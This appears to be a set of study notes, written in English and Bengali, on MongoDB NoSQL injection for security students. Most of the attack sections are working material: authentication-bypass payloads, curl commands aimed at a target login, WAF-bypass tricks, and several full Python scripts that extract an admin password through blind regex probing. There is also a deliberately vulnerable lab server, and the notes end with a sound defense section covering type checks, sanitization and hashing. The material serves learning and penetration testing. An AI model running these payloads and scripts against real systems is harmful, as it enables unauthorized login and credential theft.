# 🍃 NoSQL Injection — Detailed Study Notes

> **Source:** [PayloadsAllTheThings/NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
> **Primary Target:** MongoDB (most common NoSQL DB)
> **Audience:** Cybersecurity students, ethical hackers, bug bounty hunters
> **Disclaimer:** শুধুমাত্র authorized system এবং lab environment এ practice করো।

---

## 📚 Table of Contents

1. [Concept — NoSQL Injection কী?](#1-concept--nosql-injection-কী)
2. [SQL vs NoSQL — মূল পার্থক্য](#2-sql-vs-nosql--মূল-পার্থক্য)
3. [MongoDB Query Operators — Attack Arsenal](#3-mongodb-query-operators--attack-arsenal)
4. [Operator Injection](#4-operator-injection)
5. [Authentication Bypass](#5-authentication-bypass)
6. [Data Extraction Attacks](#6-data-extraction-attacks)
   - [Extract Length Information](#61-extract-length-information)
   - [Extract Data with $regex](#62-extract-data-with-regex)
   - [Extract Data with $in](#63-extract-data-with-in)
7. [Blind NoSQL Injection](#7-blind-nosql-injection)
   - [POST JSON Body — Python](#71-post-json-body--python)
   - [POST urlencoded — Python](#72-post-urlencoded--python)
   - [GET Parameter — Python](#73-get-parameter--python)
8. [WAF Bypass Techniques](#8-waf-bypass-techniques)
9. [Practical Lab Setup](#9-practical-lab-setup)
10. [Testing Methodology](#10-testing-methodology)
11. [Defense Cheat Sheet](#11-defense-cheat-sheet)
12. [References](#12-references)

---

## 1. Concept — NoSQL Injection কী?

### Traditional SQL Injection vs NoSQL Injection

```
SQL Injection:
  Query: SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
  Attack: ' OR '1'='1
  Result: SELECT * FROM users WHERE username='' OR '1'='1' AND password=''

NoSQL Injection (MongoDB):
  Query: db.users.find({ username: INPUT, password: INPUT })
  Attack: { "$ne": null }  ← JSON operator inject করো!
  Result: db.users.find({ username: {$ne: null}, password: {$ne: null} })
  → Matches ALL users (where username is not null) → Login bypass!
```

```
Key Difference:
┌──────────────────────────────────────────────────────────┐
│                                                          │
│  SQL Injection:   String manipulation (', ", --, etc.)   │
│  NoSQL Injection: JSON/Object manipulation ($operators)  │
│                                                          │
│  SQL uses:    SELECT, WHERE, OR, AND                     │
│  MongoDB uses: $ne, $gt, $regex, $where, $in            │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

### কোথায় NoSQL Database পাবে?

```
Popular NoSQL Databases:
  ✅ MongoDB    → most common, JSON documents
  ✅ CouchDB    → HTTP API based
  ✅ Redis      → key-value store
  ✅ Cassandra  → wide-column store
  ✅ DynamoDB   → AWS managed

Signs a target uses MongoDB:
  - MEAN/MERN/MEVN stack app
  - Error messages: "MongoError", "BSONError"
  - Response format: JSON with "_id" field
  - Stack: Node.js + Express + Mongoose
  - Cloud: MongoDB Atlas
```

---

## 2. SQL vs NoSQL — মূল পার্থক্য

```
SQL (Relational):
┌──────────┬──────────┬───────────┐
│ user_id  │ username │ password  │
├──────────┼──────────┼───────────┤
│ 1        │ admin    │ pass123   │
│ 2        │ john     │ secret    │
└──────────┴──────────┴───────────┘

Query: SELECT * FROM users WHERE username='admin' AND password='pass'

MongoDB (Document):
[
  { "_id": ObjectId("..."), "username": "admin", "password": "pass123", "role": "admin" },
  { "_id": ObjectId("..."), "username": "john",  "password": "secret",  "role": "user"  }
]

Query: db.users.find({ username: "admin", password: "pass" })
```

```
MongoDB Query Structure:
  db.COLLECTION.find(QUERY_OBJECT)

  Normal:
    { "username": "admin", "password": "secret" }
    → Find documents where username IS "admin" AND password IS "secret"

  Operator:
    { "username": "admin", "password": { "$ne": "wrong" } }
    → Find documents where username IS "admin" AND password IS NOT "wrong"
    → Admin এর যেকোনো password match করবে!
```

---

## 3. MongoDB Query Operators — Attack Arsenal

```
┌──────────┬────────────────────┬───────────────────────────────────────┐
│ Operator │ মানে               │ Attack Usage                          │
├──────────┼────────────────────┼───────────────────────────────────────┤
│ $ne      │ not equal          │ password ≠ "anything" → always true   │
│ $gt      │ greater than       │ "" > "" → true (string comparison)    │
│ $lt      │ less than          │ Similar to $gt                        │
│ $gte     │ greater or equal   │ Bypass null checks                    │
│ $regex   │ regular expression │ Extract data char by char             │
│ $in      │ in array           │ Test multiple values at once          │
│ $nin     │ not in array       │ Exclude specific values               │
│ $exists  │ field exists       │ Check field presence                  │
│ $where   │ JS expression      │ Most powerful — RCE possible!         │
│ $or      │ logical OR         │ Multiple conditions                   │
│ $and     │ logical AND        │ Combine conditions                    │
└──────────┴────────────────────┴───────────────────────────────────────┘
```

### How Operators Work in Queries

```javascript
// Normal MongoDB queries:
db.users.find({ age: { $gt: 18 } }) // age > 18
db.users.find({ name: { $ne: 'admin' } }) // name != "admin"
db.users.find({ email: { $regex: '^a' } }) // email starts with 'a'
db.users.find({ role: { $in: ['admin', 'mod'] } }) // role is admin OR mod

// Attack: inject these operators via user input!
```

---

## 4. Operator Injection

### How It Happens — Vulnerable Code

```javascript
// Node.js + Express + MongoDB — VULNERABLE:

app.post('/search', async (req, res) => {
  const { price } = req.body

  // ❌ VULNERABLE: user input directly in query!
  const products = await db
    .collection('products')
    .find({
      price: price, // price = { "$gt": 0 } inject করা সম্ভব!
    })
    .toArray()

  res.json(products)
})
```

```
Normal Usage:
  POST /search
  Body: { "price": 100 }
  Query: db.products.find({ price: 100 })
  Result: Products with price = 100

Attack:
  POST /search
  Body: { "price": { "$gt": 0 } }
  Query: db.products.find({ price: { "$gt": 0 } })
  Result: ALL products where price > 0 → DATA LEAK!
```

### Attack Payloads for Different Input Types

```
URL-encoded form:
  price[$gt]=0
  price[$ne]=999999
  price[$regex]=.*

JSON body:
  {"price": {"$gt": 0}}
  {"price": {"$ne": 99999}}
  {"price": {"$regex": ".*"}}

Burp Suite:
  Content-Type: application/json → JSON body
  Content-Type: application/x-www-form-urlencoded → bracket notation
```

---

## 5. Authentication Bypass

### Concept

```javascript
// Vulnerable login code:
app.post('/login', async (req, res) => {
  const { username, password } = req.body

  // ❌ VULNERABLE:
  const user = await db.collection('users').findOne({
    username: username, // inject করা যাবে!
    password: password, // inject করা যাবে!
  })

  if (user) {
    res.json({ success: true, token: generateToken(user) })
  }
})
```

### Attack Payloads

#### HTTP Form Data (URL-encoded)

```bash
# $ne (not equal) — password != "toto" → matches anything!
username[$ne]=toto&password[$ne]=toto
# Query: { username: {$ne:"toto"}, password: {$ne:"toto"} }
# → First user in DB return করে!

# $regex — username matches pattern
login[$regex]=a.*&pass[$ne]=lol
# → username starts with 'a', any password

# $gt — string comparison bypass
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
# → username between "admin" and "test" alphabetically

# $nin — not in array
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
# → username is neither "admin" nor "test"
```

#### JSON Body

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

#### curl দিয়ে test করো

```bash
# JSON body attack:
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# URL-encoded attack:
curl -X POST http://target.com/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'username[$ne]=invalid&password[$ne]=invalid'

# Get request attack:
curl "http://target.com/login?username[$ne]=x&password[$ne]=x"
```

### Admin Login Bypass with Known Username

```bash
# Admin username জানি, password জানি না:
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "wrong"}}'

# Result: Logs in as admin!
```

---

## 6. Data Extraction Attacks

### 6.1 Extract Length Information

```
$regex অপারেটর দিয়ে character count বের করা।
`.{N}` = N টা যেকোনো character match করে।

Strategy: Password এর length কতো?
  password[$regex]=.{1}  → যদি login success → password length >= 1
  password[$regex]=.{5}  → যদি login success → password length >= 5
  password[$regex]=.{10} → যদি fail → password length < 10
  password[$regex]=.{8}  → যদি success → password length >= 8
  password[$regex]=.{9}  → যদি fail → length = 8!
```

```bash
# Length testing:
for i in {1..20}; do
  result=$(curl -s -X POST http://target.com/login \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username[\$ne]=invalid&password[\$regex]=.{$i}" \
    -w "%{http_code}")
  echo "Length $i: $result"
done

# যেখানে response বদলে যায় → সেটাই password length!
```

### 6.2 Extract Data with $regex

```
Character by character password extract করা।

Strategy: password টা কি 'm' দিয়ে শুরু?
  $regex = "^m" → match হলে → yes!
  $regex = "^md" → match হলে → "md" দিয়ে শুরু!
  $regex = "^mdp" → match হলে → "mdp" দিয়ে শুরু!
  ... চালিয়ে যাও যতক্ষণ পুরো password পাওয়া যায়
```

```bash
# HTTP URL-encoded:
username[$ne]=toto&password[$regex]=m.{2}    # password starts with m, length 3
username[$ne]=toto&password[$regex]=md.{1}   # starts with "md", length 3
username[$ne]=toto&password[$regex]=mdp      # exact match check

username[$ne]=toto&password[$regex]=m.*      # starts with m, any length
username[$ne]=toto&password[$regex]=md.*     # starts with md, any length
```

```json
// JSON body:
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

### 6.3 Extract Data with $in

```json
// একসাথে multiple usernames test করো:
{
  "username": { "$in": ["Admin", "4dm1n", "admin", "root", "administrator"] },
  "password": { "$gt": "" }
}

// কোনো একটা match হলে → সেটাই valid username!
// তারপর সেই username দিয়ে password extract করো
```

---

## 7. Blind NoSQL Injection

**Blind** = Response এ data directly দেখা যায় না, কিন্তু success/fail দেখে data বের করতে পারি।

### 7.1 POST JSON Body — Python

```python
import requests
import urllib3
import string
urllib3.disable_warnings()

# ═══════════════════════════════════════════════
# Blind NoSQL Injection — JSON POST
# Admin password extract করো character by character
# ═══════════════════════════════════════════════

username = "admin"
password = ""
url = "http://example.org/login"
headers = {'content-type': 'application/json'}

print(f"[*] Target: {url}")
print(f"[*] Username: {username}")
print(f"[*] Starting blind extraction...\n")

while True:
    found = False
    for c in string.printable:
        # এই characters regex এ special meaning আছে — skip করো
        if c not in ['*', '+', '.', '?', '|', '\\']:

            # payload: password টা "^{already_found}{current_char}" দিয়ে শুরু হয়?
            payload = '{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (
                username,
                password + c
            )

            r = requests.post(
                url,
                data=payload,
                headers=headers,
                verify=False,
                allow_redirects=False
            )

            # Success condition: login হলো! (200 OK বা 302 Redirect)
            if 'OK' in r.text or r.status_code == 302:
                print(f"[+] Found character: {c}")
                print(f"[+] Password so far: {password + c}")
                password += c
                found = True
                break

    if not found:
        print(f"\n[✓] Extraction complete!")
        print(f"[✓] Password: {password}")
        break
```

### 7.2 POST urlencoded — Python

```python
import requests
import urllib3
import string
urllib3.disable_warnings()

# ═══════════════════════════════════════════════
# Blind NoSQL Injection — URL-encoded POST
# ═══════════════════════════════════════════════

username = "admin"
password = ""
url = "http://example.org/login"
headers = {'content-type': 'application/x-www-form-urlencoded'}

print(f"[*] Method: POST urlencoded")
print(f"[*] Target: {url}\n")

while True:
    found = False
    for c in string.printable:
        # URL-encoded request এ এই chars dangerous/invalid:
        if c not in ['*', '+', '.', '?', '|', '&', '$']:

            # Bracket notation: pass[$regex]=^CHARS
            payload = 'user=%s&pass[$regex]=^%s&remember=on' % (
                username,
                password + c
            )

            r = requests.post(
                url,
                data=payload,
                headers=headers,
                verify=False,
                allow_redirects=False
            )

            # Success: 302 redirect to /dashboard
            if r.status_code == 302 and r.headers.get('Location') == '/dashboard':
                print(f"[+] Found: {password + c}")
                password += c
                found = True
                break

    if not found:
        print(f"\n[✓] Password: {password}")
        break
```

### 7.3 GET Parameter — Python

```python
import requests
import urllib3
import string
urllib3.disable_warnings()

# ═══════════════════════════════════════════════
# Blind NoSQL Injection — GET Request
# ═══════════════════════════════════════════════

username = 'admin'
password = ''
url = 'http://example.org/login'

print(f"[*] Method: GET")
print(f"[*] URL: {url}\n")

while True:
    found = False
    for c in string.printable:
        # GET request এ এই chars URL conflict করে:
        if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:

            # GET parameter: ?username=admin&password[$regex]=^CHARS
            payload = f"?username={username}&password[$regex]=^{password + c}"

            r = requests.get(url + payload)

            # Success indicator:
            if 'Yeah' in r.text or 'Welcome' in r.text or r.status_code == 302:
                print(f"[+] Found: {password + c}")
                password += c
                found = True
                break

    if not found:
        print(f"\n[✓] Password: {password}")
        break
```

### Enhanced Script — Auto-detect success condition

```python
import requests
import urllib3
import string
import time
urllib3.disable_warnings()

# ═══════════════════════════════════════════════
# Advanced Blind NoSQL Injector
# ═══════════════════════════════════════════════

class NoSQLBlindInjector:
    def __init__(self, url, username="admin", method="json"):
        self.url = url
        self.username = username
        self.method = method
        self.session = requests.Session()
        self.session.verify = False

        # First, detect success condition:
        self.success_indicator = self._detect_success()

    def _detect_success(self):
        """
        Valid credential দিয়ে কী response আসে সেটা detect করো।
        $ne payload দিয়ে first user এর response নাও।
        """
        if self.method == "json":
            payload = '{"username": {"$ne": null}, "password": {"$ne": null}}'
            headers = {'Content-Type': 'application/json'}
            r = self.session.post(self.url, data=payload, headers=headers, allow_redirects=False)
        else:
            payload = 'username[$ne]=x&password[$ne]=x'
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            r = self.session.post(self.url, data=payload, headers=headers, allow_redirects=False)

        print(f"[*] Baseline response: status={r.status_code}, length={len(r.text)}")
        return {'status': r.status_code, 'length': len(r.text)}

    def test_char(self, current_password, char):
        """এই character টা password এর পরবর্তী character কিনা test করো।"""
        regex_payload = f"^{current_password}{char}"

        if self.method == "json":
            payload = f'{{"username": {{"$eq": "{self.username}"}}, "password": {{"$regex": "{regex_payload}"}}}}'
            headers = {'Content-Type': 'application/json'}
            r = self.session.post(self.url, data=payload, headers=headers, allow_redirects=False)
        elif self.method == "urlencoded":
            payload = f"username={self.username}&password[$regex]={regex_payload}"
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            r = self.session.post(self.url, data=payload, headers=headers, allow_redirects=False)
        else:  # GET
            r = self.session.get(f"{self.url}?username={self.username}&password[$regex]={regex_payload}")

        # Status code বা length দিয়ে success detect করো:
        return (r.status_code == self.success_indicator['status'] and
                len(r.text) == self.success_indicator['length'])

    def extract_password(self):
        password = ""
        charset = string.ascii_letters + string.digits + string.punctuation
        exclude = ['*', '+', '.', '?', '|', '#', '&', '$', '\\']
        safe_chars = [c for c in charset if c not in exclude]

        print(f"\n[*] Starting extraction for user: {self.username}")

        while True:
            found = False
            for c in safe_chars:
                if self.test_char(password, c):
                    password += c
                    print(f"\r[+] Password: {password}", end='', flush=True)
                    found = True
                    break
                time.sleep(0.05)  # Rate limiting avoid করো

            if not found:
                break

        print(f"\n[✓] Final password: {password}")
        return password

# Usage:
injector = NoSQLBlindInjector(
    url="http://example.org/login",
    username="admin",
    method="json"  # "json", "urlencoded", or "get"
)
password = injector.extract_password()
```

---

## 8. WAF Bypass Techniques

### Duplicate Key Trick (MongoDB specific)

```javascript
// MongoDB behavior: duplicate key হলে শেষেরটা জেতে!
{"id": "10", "id": "100"}
// → id = "100" (শেষেরটা!)

// Attack:
// যদি server তোমার input কে merge করে existing query তে:
// Existing: {"id": "10", "role": "user"}
// Injected: {"id": "10", "id": "100"}
// Result: id = "100" (pre-condition override!)
```

### Case Variation

```javascript
// MongoDB operator case-sensitive:
{"$ne": null}   // works
{"$NE": null}   // doesn't work (standard MongoDB)

// কিন্তু কিছু frameworks case normalize করে:
// Try:
{"$Ne": null}
{"$nE": null}
```

### Unicode/Encoding Bypass

```
URL encoding:
  $ne → %24ne ($ = %24)

Double encoding:
  $ne → %2524ne (%25 = %)

JSON string bypass:
  {"username": {"$ne": null}}
  → Escape করো: {\"username\": {\"\$ne\": null}}
```

### Array Injection

```bash
# Some WAFs block $operators but allow arrays:
username[]=admin&username[]=user&password[$ne]=wrong

# MongoDB receives:
{ username: ["admin", "user"], password: {$ne: "wrong"} }
# → Matches documents where username is in the array!
```

---

## 9. Practical Lab Setup

### Lab 1: nosqlilab (Official Vulnerable Lab)

```bash
# Docker দিয়ে nosqlilab চালাও:
git clone https://github.com/digininja/nosqlilab
cd nosqlilab
docker-compose up -d

# Browser: http://localhost:8080
```

### Lab 2: নিজে বানাও — Vulnerable Node.js + MongoDB

```bash
mkdir nosql-lab && cd nosql-lab
npm init -y
npm install express mongoose body-parser

cat > server.js << 'EOF'
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// MongoDB connect:
mongoose.connect('mongodb://localhost:27017/nosql_lab');

// User Schema:
const User = mongoose.model('User', new mongoose.Schema({
  username: String,
  password: String,
  role: String,
  secret: String
}));

// Seed data:
async function seedData() {
  await User.deleteMany({});
  await User.create([
    { username: 'admin', password: 'supersecret123', role: 'admin', secret: 'FLAG{nosql_pwned}' },
    { username: 'john',  password: 'john_password',  role: 'user',  secret: 'nothing special' }
  ]);
  console.log('[*] DB seeded!');
}

// ❌ VULNERABLE LOGIN:
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  try {
    // VULNERABLE: Direct injection possible!
    const user = await User.findOne({
      username: username,
      password: password
    });

    if (user) {
      res.json({
        status: 'OK',
        message: `Welcome ${user.username}!`,
        role: user.role
      });
    } else {
      res.status(401).json({ status: 'FAIL', message: 'Invalid credentials' });
    }
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ❌ VULNERABLE SEARCH:
app.post('/search', async (req, res) => {
  const { price } = req.body;
  // Operator injection possible!
  const products = [{ name: "Laptop", price: 1000 }, { name: "Phone", price: 500 }];
  res.json({ products, query_price: price });
});

app.listen(3000, async () => {
  await seedData();
  console.log('NoSQL Lab: http://localhost:3000');
});
EOF

# MongoDB চালাও (Docker):
docker run -d -p 27017:27017 --name mongodb mongo:latest

# App চালাও:
node server.js
```

```bash
# Tests:

# Normal login:
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "wrong_pass"}'
# Result: 401 FAIL

# NoSQL Injection — Auth Bypass:
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "wrong"}}'
# Result: 200 OK — Welcome admin!

# URL-encoded attack:
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'username=admin&password[$ne]=wrong'
# Result: 200 OK!

# Blind extraction — first character:
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": "^s"}}'
# Result: 200 OK! → password starts with 's'
```

### Lab 3: Root Me Challenges

```
✅ NoSQL injection - Authentication
   URL: https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication

✅ NoSQL injection - Blind
   URL: https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Blind
```

### Lab 4: NoSQLMap Tool

```bash
# NoSQLMap install:
git clone https://github.com/codingo/NoSQLMap
cd NoSQLMap
pip install -r requirements.txt

# Interactive mode:
python nosqlmap.py

# Menu options:
# 1. Set target host/port/URI
# 2. Set HTTP request type (POST/GET)
# 3. Test for NoSQL injection!
```

---

## 10. Testing Methodology

### Step 1: Identify NoSQL Backend

```bash
# Error messages দেখো:
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": "^"}}'

# MongoDB errors:
# "MongoError: Bad special operator"
# "BSONError: invalid..."
# "Cast to String failed"

# Stack trace তে "mongoose", "mongodb" দেখলে confirm!
```

### Step 2: Injection Point Test

```bash
# $ne inject করো:
curl -X POST http://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"category": {"$ne": "invalid"}}'

# URL-encoded:
curl -X POST http://target.com/search \
  -d 'category[$ne]=invalid'

# Response পরিবর্তন হলো? More data আসলো? → Vulnerable!
```

### Step 3: Authentication Bypass Test

```bash
# JSON:
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# URL-encoded:
curl -X POST http://target.com/login \
  -d 'username[$ne]=x&password[$ne]=x'

# যদি 200 OK বা redirect → auth bypass confirmed!
```

### Step 4: Data Extraction

```bash
# Known username এর password extract করো:
# Step 1: Length find করো
for i in {1..20}; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://target.com/login \
    -H "Content-Type: application/json" \
    -d "{\"username\": {\"\\$eq\": \"admin\"}, \"password\": {\"\\$regex\": \"^.{$i}$\"}}")
  echo "Length $i: HTTP $STATUS"
done

# Step 2: Blind script চালাও (Section 7 এর scripts)
python3 blind_nosql.py
```

### Step 5: Tool-based Automated Scan

```bash
# Burp Suite + NoSQLi Scanner extension:
# 1. Target site proxy করো
# 2. Extensions → BApp Store → "NoSQL Scanner"
# 3. Login request টা Scanner এ পাঠাও
# 4. Scan results দেখো

# NoSQLMap:
python nosqlmap.py
# → Configure target → Run tests
```

---

## 11. Defense Cheat Sheet

### ✅ Fix 1: Input Validation — Type Check

```javascript
// ❌ VULNERABLE:
const user = await User.findOne({
  username: req.body.username, // Object inject হতে পারে!
  password: req.body.password,
})

// ✅ SAFE: Type validation করো
const { username, password } = req.body

// String type enforce করো:
if (typeof username !== 'string' || typeof password !== 'string') {
  return res.status(400).json({ error: 'Invalid input type' })
}

// আরো validation:
if (!username || !password) {
  return res.status(400).json({ error: 'Missing credentials' })
}

const user = await User.findOne({ username, password })
```

### ✅ Fix 2: MongoDB Sanitization Library

```javascript
// npm install mongo-sanitize
const sanitize = require('mongo-sanitize');

app.post('/login', async (req, res) => {
  // sanitize: $ দিয়ে শুরু যেকোনো key remove করে!
  const username = sanitize(req.body.username);
  const password = sanitize(req.body.password);

  // {"$ne": null} → sanitize → {} (empty!) → safe

  const user = await User.findOne({ username, password });
  ...
});
```

### ✅ Fix 3: Password Hashing (bcrypt)

```javascript
// ❌ VULNERABLE: Plaintext password comparison
// $regex দিয়ে extract করা যায়!

// ✅ SAFE: bcrypt hash comparison
const bcrypt = require('bcrypt')

// Registration:
const hashedPassword = await bcrypt.hash(password, 12)
await User.create({ username, password: hashedPassword })

// Login:
const user = await User.findOne({ username: String(username) })
if (!user) return res.status(401).json({ error: 'Invalid credentials' })

// bcrypt compare: regex injection যাবে না কারণ hash compare হচ্ছে!
const isValid = await bcrypt.compare(String(password), user.password)
if (!isValid) return res.status(401).json({ error: 'Invalid credentials' })
```

### ✅ Fix 4: Mongoose Schema Enforcement

```javascript
// Mongoose schema type enforce করে!
const userSchema = new mongoose.Schema({
  username: {
    type: String, // ← String type enforce!
    required: true,
    trim: true,
  },
  password: {
    type: String,
    required: true,
  },
})

// Mongoose automatically converts object to string or throws error!
// {"$ne": null} → Mongoose → Cast error or String("[object Object]")
```

### Defense Summary

```
Attack                          → Fix
────────────────────────────────────────────────────────────────────────
Operator Injection ($ne, $gt)   → typeof check: string only
                                  mongo-sanitize library
$regex password extraction      → bcrypt hashing (regex on hash = useless)
Auth bypass                     → Type validation + schema enforcement
WAF bypass via encoding         → Decode BEFORE validation
                                  Whitelist allowed characters
```

---

## 12. References

| Resource                      | Link                                                                                                                                                                     |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| PayloadsAllTheThings          | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)                                                                              |
| OWASP NoSQL Injection Testing | [OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection) |
| NoSQLMap Tool                 | [GitHub](https://github.com/codingo/NoSQLMap)                                                                                                                            |
| nosqlilab (Vulnerable Lab)    | [GitHub](https://github.com/digininja/nosqlilab)                                                                                                                         |
| MongoDB Operators Docs        | [MongoDB](https://www.mongodb.com/docs/manual/reference/operator/query/)                                                                                                 |
| mongo-sanitize (npm)          | [npm](https://www.npmjs.com/package/mongo-sanitize)                                                                                                                      |
| NoSQL Injection Wordlists     | [GitHub](https://github.com/cr0hn/nosqlinjection_wordlists)                                                                                                              |
| Root Me NoSQL Challenges      | [Root Me](https://www.root-me.org)                                                                                                                                       |

---

> ✅ **Next Topic Suggestions:**
>
> - `SQL Injection/README.md` — Classic SQL injection (comparison করো)
> - `GraphQL Injection/README.md` — Modern API injection
> - `LDAP Injection/README.md` — Directory service injection
> - `Server Side Template Injection/README.md` — $where clause → SSTI চেইন

> ⚠️ **Ethical Reminder:** NoSQL injection testing শুধুমাত্র authorized pentest, Bug Bounty scope, বা নিজের lab এ করো।
